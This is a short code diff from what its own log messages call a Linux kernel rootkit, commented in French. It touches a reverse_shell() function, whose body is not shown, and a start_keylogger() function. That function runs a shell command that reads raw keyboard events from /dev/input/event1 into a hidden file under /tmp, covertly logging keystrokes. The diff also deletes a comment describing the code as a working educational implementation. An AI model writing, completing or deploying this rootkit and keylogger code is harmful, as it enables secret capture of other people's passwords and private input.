@@ -41,7 +41,7 @@ void exec_user_cmd(const char *cmd)
 //      Reverse Shell        //
 //----------------------------//
 
-// Implémentation pédagogique fonctionnelle
+
 void reverse_shell(void)
 {
     printk(KERN_INFO "[rootkit] reverse_shell() appelé\n");
@@ -57,8 +57,6 @@ void reverse_shell(void)
 void start_keylogger(void)
 {
     printk(KERN_INFO "[rootkit] keylogger démarré (simulation)\n");
-
-    // Commande shell complète pour capturer le clavier et écrire dans un fichier.
     const char *cmd = "nohup cat /dev/input/event1 > /tmp/.keys.log 2>&1 &";
 
     exec_user_cmd(cmd);
